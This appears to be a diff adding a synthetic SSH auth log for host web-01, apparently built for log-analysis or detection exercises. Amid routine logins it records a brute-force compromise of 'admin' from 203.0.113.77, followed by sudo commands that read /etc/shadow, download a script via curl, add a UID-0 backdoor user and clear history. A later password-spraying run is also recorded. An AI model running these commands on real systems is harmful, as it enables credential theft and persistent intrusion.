@@ -1,0 +1,524 @@
+Sep 18 07:02:13 web-01 sshd[4820]: Failed password for carol from 192.168.1.21 port 63136 ssh2
+Sep 18 07:02:21 web-01 sshd[9056]: Accepted password for alice from 192.168.1.20 port 57274 ssh2
+Sep 18 07:02:22 web-01 sshd[9056]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 07:07:00 web-01 CRON[1378]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 07:21:11 web-01 sshd[4883]: Accepted password for bob from 192.168.1.12 port 64635 ssh2
+Sep 18 07:21:12 web-01 sshd[4883]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 07:28:40 web-01 sshd[4646]: Accepted password for carol from 192.168.1.45 port 57203 ssh2
+Sep 18 07:28:41 web-01 sshd[4646]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 07:31:06 web-01 sshd[4840]: Accepted password for alice from 192.168.1.45 port 45021 ssh2
+Sep 18 07:31:07 web-01 sshd[4840]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 07:32:09 web-01 sshd[2789]: Accepted password for carol from 192.168.1.50 port 60200 ssh2
+Sep 18 07:32:10 web-01 sshd[2789]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 07:32:12 web-01 sshd[2389]: Accepted password for carol from 192.168.1.20 port 61929 ssh2
+Sep 18 07:32:13 web-01 sshd[2389]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 07:33:09 web-01 sshd[4736]: Accepted password for bob from 192.168.1.11 port 60342 ssh2
+Sep 18 07:33:10 web-01 sshd[4736]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 07:35:00 web-01 CRON[2213]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 07:35:56 web-01 sshd[3290]: Accepted password for carol from 192.168.1.10 port 54031 ssh2
+Sep 18 07:35:57 web-01 sshd[3290]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 07:40:00 web-01 CRON[3887]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 07:44:04 web-01 sshd[1881]: Accepted password for dave from 192.168.1.50 port 62138 ssh2
+Sep 18 07:44:05 web-01 sshd[1881]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 07:49:04 web-01 sshd[1881]: pam_unix(sshd:session): session closed for user dave
+Sep 18 07:51:12 web-01 sshd[6325]: Accepted password for alice from 192.168.1.31 port 56414 ssh2
+Sep 18 07:51:12 web-01 sshd[2389]: pam_unix(sshd:session): session closed for user carol
+Sep 18 07:51:13 web-01 sshd[6325]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 07:52:11 web-01 sshd[4883]: pam_unix(sshd:session): session closed for user bob
+Sep 18 07:56:15 web-01 sshd[6077]: Accepted password for carol from 192.168.1.11 port 46528 ssh2
+Sep 18 07:56:16 web-01 sshd[6077]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 07:57:40 web-01 sshd[7233]: Accepted password for dave from 192.168.1.21 port 42241 ssh2
+Sep 18 07:57:41 web-01 sshd[7233]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 07:59:39 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/df -h
+Sep 18 08:00:57 web-01 sshd[2284]: Accepted password for bob from 192.168.1.21 port 46287 ssh2
+Sep 18 08:00:58 web-01 sshd[2284]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 08:03:06 web-01 sshd[4840]: pam_unix(sshd:session): session closed for user alice
+Sep 18 08:04:46 web-01 sshd[9603]: Accepted password for admin from 192.168.1.22 port 58751 ssh2
+Sep 18 08:04:47 web-01 sshd[9603]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 08:06:32 web-01 sshd[7608]: Accepted password for carol from 192.168.1.22 port 64167 ssh2
+Sep 18 08:06:33 web-01 sshd[7608]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 08:10:12 web-01 sshd[6325]: pam_unix(sshd:session): session closed for user alice
+Sep 18 08:10:31 web-01 sshd[2639]: Failed password for carol from 192.168.1.30 port 51226 ssh2
+Sep 18 08:11:00 web-01 CRON[9291]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 08:13:00 web-01 CRON[7019]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 08:15:04 web-01 sshd[3230]: Accepted password for alice from 192.168.1.50 port 51826 ssh2
+Sep 18 08:15:05 web-01 sshd[3230]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 08:22:14 web-01 sshd[8156]: Accepted password for admin from 192.168.1.12 port 40667 ssh2
+Sep 18 08:22:15 web-01 sshd[8156]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 08:24:09 web-01 sshd[2789]: pam_unix(sshd:session): session closed for user carol
+Sep 18 08:24:20 web-01 sshd[8341]: Accepted password for admin from 192.168.1.31 port 58399 ssh2
+Sep 18 08:24:21 web-01 sshd[8341]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 08:26:40 web-01 sshd[7233]: pam_unix(sshd:session): session closed for user dave
+Sep 18 08:28:09 web-01 sshd[4736]: pam_unix(sshd:session): session closed for user bob
+Sep 18 08:32:40 web-01 sshd[4646]: pam_unix(sshd:session): session closed for user carol
+Sep 18 08:39:22 web-01 sshd[5435]: Failed password for bob from 192.168.1.31 port 51524 ssh2
+Sep 18 08:41:56 web-01 sshd[3290]: pam_unix(sshd:session): session closed for user carol
+Sep 18 08:43:00 web-01 CRON[8118]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 08:44:18 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/docker ps
+Sep 18 08:49:21 web-01 sshd[9056]: pam_unix(sshd:session): session closed for user alice
+Sep 18 08:51:55 web-01 sshd[2556]: Failed password for admin from 192.168.1.11 port 43903 ssh2
+Sep 18 08:52:04 web-01 sshd[3230]: pam_unix(sshd:session): session closed for user alice
+Sep 18 08:55:46 web-01 sshd[9603]: pam_unix(sshd:session): session closed for user admin
+Sep 18 08:59:57 web-01 sshd[2284]: pam_unix(sshd:session): session closed for user bob
+Sep 18 09:01:55 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+Sep 18 09:08:00 web-01 CRON[7693]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 09:10:25 web-01 sshd[3925]: Accepted password for dave from 192.168.1.22 port 42498 ssh2
+Sep 18 09:10:26 web-01 sshd[3925]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 09:18:00 web-01 CRON[2316]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 09:19:00 web-01 CRON[6178]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 09:19:14 web-01 sshd[8156]: pam_unix(sshd:session): session closed for user admin
+Sep 18 09:23:15 web-01 sshd[6077]: pam_unix(sshd:session): session closed for user carol
+Sep 18 09:24:00 web-01 CRON[2690]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 09:28:45 web-01 sshd[1716]: Accepted password for bob from 192.168.1.12 port 61649 ssh2
+Sep 18 09:28:46 web-01 sshd[1716]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 09:31:45 web-01 sshd[1716]: pam_unix(sshd:session): session closed for user bob
+Sep 18 09:32:20 web-01 sshd[8341]: pam_unix(sshd:session): session closed for user admin
+Sep 18 09:34:05 web-01 sshd[4429]: Failed password for admin from 192.168.1.30 port 46230 ssh2
+Sep 18 09:46:25 web-01 sshd[3925]: pam_unix(sshd:session): session closed for user dave
+Sep 18 09:47:08 web-01 sshd[5346]: Accepted password for bob from 192.168.1.50 port 52662 ssh2
+Sep 18 09:47:09 web-01 sshd[5346]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 09:51:32 web-01 sshd[7608]: pam_unix(sshd:session): session closed for user carol
+Sep 18 09:53:05 web-01 sshd[4174]: Accepted password for alice from 192.168.1.20 port 45142 ssh2
+Sep 18 09:53:06 web-01 sshd[4174]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 09:53:40 web-01 sshd[6428]: Accepted password for dave from 192.168.1.15 port 43523 ssh2
+Sep 18 09:53:41 web-01 sshd[6428]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 09:55:50 web-01 sshd[8490]: Accepted password for carol from 192.168.1.50 port 59772 ssh2
+Sep 18 09:55:51 web-01 sshd[8490]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 09:56:00 web-01 CRON[3248]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 10:01:04 web-01 sshd[5296]: Accepted password for alice from 192.168.1.31 port 50274 ssh2
+Sep 18 10:01:05 web-01 sshd[5296]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 10:05:00 web-01 CRON[7614]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 10:06:20 web-01 sshd[6441]: Accepted password for admin from 192.168.1.31 port 56245 ssh2
+Sep 18 10:06:21 web-01 sshd[6441]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 10:08:12 web-01 sshd[4097]: Accepted password for alice from 192.168.1.22 port 42887 ssh2
+Sep 18 10:08:13 web-01 sshd[4097]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 10:17:55 web-01 sshd[6038]: Accepted password for carol from 192.168.1.30 port 62529 ssh2
+Sep 18 10:17:56 web-01 sshd[6038]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 10:19:00 web-01 CRON[8589]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 10:20:15 web-01 sshd[4488]: Failed password for dave from 192.168.1.50 port 62096 ssh2
+Sep 18 10:21:01 web-01 sshd[20000]: Failed password for admin from 203.0.113.77 port 51000 ssh2
+Sep 18 10:21:02 web-01 sshd[20001]: Failed password for admin from 203.0.113.77 port 51001 ssh2
+Sep 18 10:21:03 web-01 sshd[20002]: Failed password for admin from 203.0.113.77 port 51002 ssh2
+Sep 18 10:21:04 web-01 sshd[20003]: Failed password for admin from 203.0.113.77 port 51003 ssh2
+Sep 18 10:21:06 web-01 sshd[7630]: Accepted password for alice from 192.168.1.12 port 58922 ssh2
+Sep 18 10:21:06 web-01 sshd[20004]: Failed password for admin from 203.0.113.77 port 51004 ssh2
+Sep 18 10:21:07 web-01 sshd[7630]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 10:21:07 web-01 sshd[20005]: Failed password for admin from 203.0.113.77 port 51005 ssh2
+Sep 18 10:21:08 web-01 sshd[20006]: Failed password for admin from 203.0.113.77 port 51006 ssh2
+Sep 18 10:21:10 web-01 sshd[20007]: Failed password for admin from 203.0.113.77 port 51007 ssh2
+Sep 18 10:21:11 web-01 sshd[20008]: Failed password for admin from 203.0.113.77 port 51008 ssh2
+Sep 18 10:21:12 web-01 sshd[20009]: Failed password for admin from 203.0.113.77 port 51009 ssh2
+Sep 18 10:21:14 web-01 sshd[20010]: Failed password for admin from 203.0.113.77 port 51010 ssh2
+Sep 18 10:21:15 web-01 sshd[20011]: Failed password for admin from 203.0.113.77 port 51011 ssh2
+Sep 18 10:21:16 web-01 sshd[20012]: Failed password for admin from 203.0.113.77 port 51012 ssh2
+Sep 18 10:21:17 web-01 sshd[20013]: Failed password for admin from 203.0.113.77 port 51013 ssh2
+Sep 18 10:21:19 web-01 sshd[20014]: Failed password for admin from 203.0.113.77 port 51014 ssh2
+Sep 18 10:21:20 web-01 sshd[20015]: Failed password for admin from 203.0.113.77 port 51015 ssh2
+Sep 18 10:21:21 web-01 sshd[20016]: Failed password for admin from 203.0.113.77 port 51016 ssh2
+Sep 18 10:21:24 web-01 sshd[20100]: Accepted password for admin from 203.0.113.77 port 51100 ssh2
+Sep 18 10:21:25 web-01 sshd[20100]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 10:23:01 web-01 sudo:    admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Sep 18 10:23:18 web-01 sudo:    admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.x http://203.0.113.77:8080/x.sh
+Sep 18 10:23:44 web-01 sudo:    admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod 777 /tmp/.x
+Sep 18 10:24:00 web-01 CRON[6572]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 10:24:09 web-01 sudo:    admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 -m svc_backup
+Sep 18 10:24:10 web-01 useradd[20250]: new user: name=svc_backup, UID=0, GID=0, home=/home/svc_backup, shell=/bin/bash
+Sep 18 10:24:31 web-01 sudo:    admin : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/history -c
+Sep 18 10:25:35 web-01 sshd[9608]: Accepted password for alice from 192.168.1.50 port 60272 ssh2
+Sep 18 10:25:36 web-01 sshd[9608]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 10:29:00 web-01 CRON[5509]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 10:31:50 web-01 sshd[8490]: pam_unix(sshd:session): session closed for user carol
+Sep 18 10:37:00 web-01 CRON[5914]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 10:38:05 web-01 sshd[6950]: Accepted password for dave from 192.168.1.45 port 64428 ssh2
+Sep 18 10:38:06 web-01 sshd[6950]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 10:42:00 web-01 CRON[7803]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 10:44:12 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 18 10:51:08 web-01 sshd[5346]: pam_unix(sshd:session): session closed for user bob
+Sep 18 10:52:09 web-01 sshd[9676]: Accepted password for bob from 192.168.1.11 port 44604 ssh2
+Sep 18 10:52:10 web-01 sshd[9676]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 10:52:36 web-01 sshd[9003]: Accepted password for alice from 192.168.1.21 port 57103 ssh2
+Sep 18 10:52:37 web-01 sshd[9003]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 10:54:28 web-01 sshd[1070]: Accepted password for alice from 192.168.1.15 port 63149 ssh2
+Sep 18 10:54:29 web-01 sshd[1070]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 10:57:55 web-01 sshd[6473]: Failed password for admin from 192.168.1.50 port 55715 ssh2
+Sep 18 10:58:13 web-01 sshd[1339]: Failed password for bob from 192.168.1.45 port 57503 ssh2
+Sep 18 10:58:55 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/df -h
+Sep 18 10:59:40 web-01 sshd[6428]: pam_unix(sshd:session): session closed for user dave
+Sep 18 11:00:04 web-01 sshd[5296]: pam_unix(sshd:session): session closed for user alice
+Sep 18 11:04:00 web-01 CRON[6584]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 11:06:34 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 18 11:08:06 web-01 sshd[6192]: Accepted password for carol from 192.168.1.31 port 49383 ssh2
+Sep 18 11:08:07 web-01 sshd[6192]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 11:11:20 web-01 sshd[9986]: Failed password for carol from 192.168.1.11 port 50481 ssh2
+Sep 18 11:11:22 web-01 sshd[7716]: Failed password for admin from 192.168.1.21 port 47617 ssh2
+Sep 18 11:11:59 web-01 sshd[4726]: Accepted password for alice from 192.168.1.22 port 62300 ssh2
+Sep 18 11:12:00 web-01 sshd[4726]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 11:16:06 web-01 sshd[4042]: Accepted password for alice from 192.168.1.45 port 44284 ssh2
+Sep 18 11:16:07 web-01 sshd[4042]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 11:17:00 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+Sep 18 11:21:00 web-01 CRON[6222]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 11:21:12 web-01 sshd[4097]: pam_unix(sshd:session): session closed for user alice
+Sep 18 11:23:05 web-01 sshd[4174]: pam_unix(sshd:session): session closed for user alice
+Sep 18 11:23:40 web-01 sshd[6361]: Failed password for carol from 192.168.1.10 port 45627 ssh2
+Sep 18 11:23:56 web-01 sshd[3356]: Failed password for bob from 192.168.1.50 port 49814 ssh2
+Sep 18 11:25:00 web-01 CRON[5222]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 11:25:00 web-01 CRON[9779]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 11:28:05 web-01 sshd[6950]: pam_unix(sshd:session): session closed for user dave
+Sep 18 11:30:57 web-01 sshd[9604]: Accepted password for dave from 192.168.1.11 port 48444 ssh2
+Sep 18 11:30:58 web-01 sshd[9604]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 11:39:00 web-01 CRON[8163]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 11:40:06 web-01 sshd[7630]: pam_unix(sshd:session): session closed for user alice
+Sep 18 11:41:09 web-01 sshd[9676]: pam_unix(sshd:session): session closed for user bob
+Sep 18 11:41:35 web-01 sshd[9608]: pam_unix(sshd:session): session closed for user alice
+Sep 18 11:42:48 web-01 sshd[2406]: Accepted password for bob from 192.168.1.22 port 55098 ssh2
+Sep 18 11:42:49 web-01 sshd[2406]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 11:45:00 web-01 CRON[4501]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 11:46:05 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+Sep 18 11:47:30 web-01 sshd[2778]: Accepted password for carol from 192.168.1.12 port 46710 ssh2
+Sep 18 11:47:31 web-01 sshd[2778]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 11:52:06 web-01 sshd[6192]: pam_unix(sshd:session): session closed for user carol
+Sep 18 11:57:20 web-01 sshd[6441]: pam_unix(sshd:session): session closed for user admin
+Sep 18 11:57:58 web-01 sshd[7888]: Accepted password for alice from 192.168.1.20 port 50505 ssh2
+Sep 18 11:57:59 web-01 sshd[7888]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 12:03:06 web-01 sshd[4042]: pam_unix(sshd:session): session closed for user alice
+Sep 18 12:04:36 web-01 sshd[9732]: Accepted password for bob from 192.168.1.30 port 50094 ssh2
+Sep 18 12:04:37 web-01 sshd[9732]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 12:06:20 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/docker ps
+Sep 18 12:08:53 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+Sep 18 12:10:05 web-01 sshd[9412]: Accepted password for dave from 192.168.1.22 port 55000 ssh2
+Sep 18 12:10:06 web-01 sshd[9412]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 12:11:51 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/docker ps
+Sep 18 12:11:55 web-01 sshd[6038]: pam_unix(sshd:session): session closed for user carol
+Sep 18 12:14:36 web-01 sshd[9003]: pam_unix(sshd:session): session closed for user alice
+Sep 18 12:15:39 web-01 sshd[3933]: Accepted password for dave from 192.168.1.21 port 41038 ssh2
+Sep 18 12:15:40 web-01 sshd[3933]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 12:18:42 web-01 sshd[2942]: Accepted password for alice from 192.168.1.21 port 55103 ssh2
+Sep 18 12:18:43 web-01 sshd[2942]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 12:19:04 web-01 sshd[2824]: Accepted password for alice from 192.168.1.31 port 47013 ssh2
+Sep 18 12:19:05 web-01 sshd[2824]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 12:22:47 web-01 sshd[5971]: Failed password for carol from 192.168.1.15 port 60934 ssh2
+Sep 18 12:24:41 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 18 12:28:00 web-01 CRON[8283]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 12:28:28 web-01 sshd[1070]: pam_unix(sshd:session): session closed for user alice
+Sep 18 12:30:00 web-01 CRON[9479]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 12:30:34 web-01 sshd[1252]: Failed password for admin from 192.168.1.21 port 54726 ssh2
+Sep 18 12:30:34 web-01 sshd[9732]: Failed password for alice from 192.168.1.11 port 53454 ssh2
+Sep 18 12:37:54 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+Sep 18 12:38:08 web-01 sshd[5434]: Accepted password for carol from 192.168.1.50 port 63338 ssh2
+Sep 18 12:38:09 web-01 sshd[5434]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 12:41:00 web-01 CRON[3934]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 12:43:58 web-01 sshd[7888]: pam_unix(sshd:session): session closed for user alice
+Sep 18 12:46:04 web-01 sshd[4536]: Accepted password for carol from 192.168.1.45 port 45357 ssh2
+Sep 18 12:46:05 web-01 sshd[4536]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 12:46:34 web-01 sshd[6123]: Accepted password for admin from 192.168.1.20 port 57714 ssh2
+Sep 18 12:46:35 web-01 sshd[6123]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 12:51:06 web-01 sshd[4725]: Accepted password for admin from 192.168.1.15 port 52084 ssh2
+Sep 18 12:51:07 web-01 sshd[4725]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 12:51:15 web-01 sshd[5972]: Accepted password for carol from 192.168.1.45 port 51254 ssh2
+Sep 18 12:51:16 web-01 sshd[5972]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 12:52:42 web-01 sshd[2942]: pam_unix(sshd:session): session closed for user alice
+Sep 18 12:54:59 web-01 sshd[4726]: pam_unix(sshd:session): session closed for user alice
+Sep 18 12:59:55 web-01 sshd[9038]: Failed password for bob from 192.168.1.21 port 43809 ssh2
+Sep 18 13:00:42 web-01 sshd[4502]: Accepted password for admin from 192.168.1.20 port 46275 ssh2
+Sep 18 13:00:43 web-01 sshd[4502]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 13:08:00 web-01 CRON[4624]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 13:09:37 web-01 sshd[4540]: Accepted password for admin from 192.168.1.21 port 43391 ssh2
+Sep 18 13:09:38 web-01 sshd[4540]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 13:09:45 web-01 sshd[1930]: Accepted password for bob from 192.168.1.31 port 63725 ssh2
+Sep 18 13:09:46 web-01 sshd[1930]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 13:13:48 web-01 sshd[2406]: pam_unix(sshd:session): session closed for user bob
+Sep 18 13:17:00 web-01 CRON[5385]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 13:20:42 web-01 sshd[4502]: pam_unix(sshd:session): session closed for user admin
+Sep 18 13:23:57 web-01 sshd[9604]: pam_unix(sshd:session): session closed for user dave
+Sep 18 13:24:00 web-01 CRON[6603]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 13:26:39 web-01 sshd[3933]: pam_unix(sshd:session): session closed for user dave
+Sep 18 13:27:06 web-01 sshd[4725]: pam_unix(sshd:session): session closed for user admin
+Sep 18 13:27:12 web-01 sshd[4981]: Accepted password for dave from 192.168.1.11 port 49872 ssh2
+Sep 18 13:27:13 web-01 sshd[4981]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 13:28:00 web-01 CRON[4006]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 13:35:07 web-01 sshd[4632]: Failed password for bob from 192.168.1.15 port 60338 ssh2
+Sep 18 13:36:12 web-01 sshd[4981]: pam_unix(sshd:session): session closed for user dave
+Sep 18 13:37:00 web-01 CRON[4699]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 13:38:00 web-01 CRON[1913]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 13:42:07 web-01 sshd[1219]: Accepted password for carol from 192.168.1.10 port 47615 ssh2
+Sep 18 13:42:08 web-01 sshd[1219]: pam_unix(sshd:session): session opened for user carol by (uid=0)
+Sep 18 13:42:30 web-01 sshd[2778]: pam_unix(sshd:session): session closed for user carol
+Sep 18 13:45:34 web-01 sshd[9637]: Accepted password for dave from 192.168.1.45 port 53654 ssh2
+Sep 18 13:45:35 web-01 sshd[9637]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 13:48:00 web-01 sshd[8111]: Accepted password for alice from 192.168.1.50 port 63625 ssh2
+Sep 18 13:48:01 web-01 sshd[8111]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Sep 18 13:48:08 web-01 sshd[5434]: pam_unix(sshd:session): session closed for user carol
+Sep 18 13:50:04 web-01 sshd[2824]: pam_unix(sshd:session): session closed for user alice
+Sep 18 13:51:05 web-01 sshd[9412]: pam_unix(sshd:session): session closed for user dave
+Sep 18 13:53:38 web-01 sshd[1585]: Accepted password for admin from 192.168.1.45 port 47690 ssh2
+Sep 18 13:53:39 web-01 sshd[1585]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 13:54:02 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+Sep 18 13:55:36 web-01 sshd[9732]: pam_unix(sshd:session): session closed for user bob
+Sep 18 14:02:00 web-01 sshd[30000]: Failed password for alice from 198.51.100.23 port 52000 ssh2
+Sep 18 14:02:11 web-01 sshd[30001]: Failed password for bob from 198.51.100.23 port 52001 ssh2
+Sep 18 14:02:22 web-01 sshd[30002]: Failed password for carol from 198.51.100.23 port 52002 ssh2
+Sep 18 14:02:33 web-01 sshd[30003]: Failed password for dave from 198.51.100.23 port 52003 ssh2
+Sep 18 14:02:44 web-01 sshd[30004]: Failed password for invalid user eve from 198.51.100.23 port 52004 ssh2
+Sep 18 14:02:55 web-01 sshd[30005]: Failed password for invalid user frank from 198.51.100.23 port 52005 ssh2
+Sep 18 14:03:06 web-01 sshd[30006]: Failed password for invalid user grace from 198.51.100.23 port 52006 ssh2
+Sep 18 14:03:17 web-01 sshd[30007]: Failed password for alice from 198.51.100.23 port 52007 ssh2
+Sep 18 14:03:28 web-01 sshd[30008]: Failed password for bob from 198.51.100.23 port 52008 ssh2
+Sep 18 14:03:39 web-01 sshd[30009]: Failed password for carol from 198.51.100.23 port 52009 ssh2
+Sep 18 14:03:50 web-01 sshd[30010]: Failed password for dave from 198.51.100.23 port 52010 ssh2
+Sep 18 14:04:01 web-01 sshd[30011]: Failed password for invalid user eve from 198.51.100.23 port 52011 ssh2
+Sep 18 14:04:12 web-01 sshd[30012]: Failed password for invalid user frank from 198.51.100.23 port 52012 ssh2
+Sep 18 14:04:23 web-01 sshd[30013]: Failed password for invalid user grace from 198.51.100.23 port 52013 ssh2
+Sep 18 14:05:21 web-01 sshd[8751]: Accepted password for admin from 192.168.1.30 port 64397 ssh2
+Sep 18 14:05:22 web-01 sshd[8751]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Sep 18 14:07:59 web-01 sshd[6270]: Accepted password for bob from 192.168.1.30 port 41290 ssh2
+Sep 18 14:08:00 web-01 sshd[6270]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 14:11:25 web-01 sshd[1196]: Accepted password for dave from 192.168.1.12 port 56277 ssh2
+Sep 18 14:11:26 web-01 sshd[1196]: pam_unix(sshd:session): session opened for user dave by (uid=0)
+Sep 18 14:13:59 web-01 sshd[6270]: pam_unix(sshd:session): session closed for user bob
+Sep 18 14:14:00 web-01 CRON[1969]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 14:16:00 web-01 CRON[5998]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 14:17:33 web-01 sshd[8372]: Failed password for alice from 192.168.1.21 port 53351 ssh2
+Sep 18 14:20:28 web-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 100 /var/log/nginx/error.log
+Sep 18 14:22:36 web-01 sshd[1750]: Accepted password for bob from 192.168.1.31 port 58199 ssh2
+Sep 18 14:22:37 web-01 sshd[1750]: pam_unix(sshd:session): session opened for user bob by (uid=0)
+Sep 18 14:24:00 web-01 CRON[4419]: pam_unix(cron:session): session opened for user root by (uid=0)
+Sep 18 14:30:37 web-01 sshd[7229]: Accepted password for dave from 192.168.1.50 port 44720 ssh2
